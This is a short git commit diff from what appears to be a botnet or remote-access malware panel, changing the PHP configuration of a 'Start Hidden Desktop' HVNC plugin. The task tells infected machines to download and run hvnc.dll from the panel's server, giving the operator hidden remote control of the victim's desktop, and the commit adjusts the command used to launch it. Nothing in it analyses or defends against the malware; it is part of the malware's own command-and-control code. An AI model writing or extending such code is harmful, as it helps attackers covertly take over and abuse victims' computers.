f320fc7708ad10126896c0005ab9d165bd74e71c
darkspiderbots <lenna15h08elli@gmail.com>
2019-09-01 16:58:40 +0200

    HVNC Task Fixed

--- versions/2.0/plugins/hvnc/hvnc.php
+++ versions/2.0/plugins/hvnc/hvnc.php
@@ -9,6 +9,6 @@ $host = "http://".$_SERVER["HTTP_HOST"];
 
 $GLOBALS["task_configuration"][$pluginName] = array(
     "name" => "Start Hidden Desktop",
-    "command" => "hvnc",
+    "command" => "runplugin",
     "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/dll/hvnc.dll;hvnc;127.0.0.1"
 );
